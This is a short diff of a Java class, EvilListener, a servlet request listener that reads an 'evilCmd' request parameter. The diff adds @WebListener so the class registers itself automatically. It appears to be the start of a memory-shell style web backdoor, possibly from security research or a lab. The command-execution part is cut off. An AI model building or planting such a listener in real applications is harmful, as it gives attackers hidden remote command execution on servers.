@@ -1,18 +1,17 @@
 package com.vdt;
 
-import jakarta.servlet.ServletOutputStream;
-import jakarta.servlet.ServletRequest;
-import jakarta.servlet.ServletRequestEvent;
-import jakarta.servlet.ServletRequestListener;
+import jakarta.servlet.*;
+import jakarta.servlet.annotation.WebListener;
 import jakarta.servlet.http.HttpServletResponse;
 
 import java.io.InputStream;
 import java.lang.reflect.Field;
 
+@WebListener
 public class EvilListener implements ServletRequestListener {
     @Override
     public void requestInitialized(ServletRequestEvent sre) {
-        // This method is called when a request comes
+        // This method is called when a request is initialized
         ServletRequest request = sre.getServletRequest();
         String cmd = request.getParameter("evilCmd");
         if (cmd != null) {
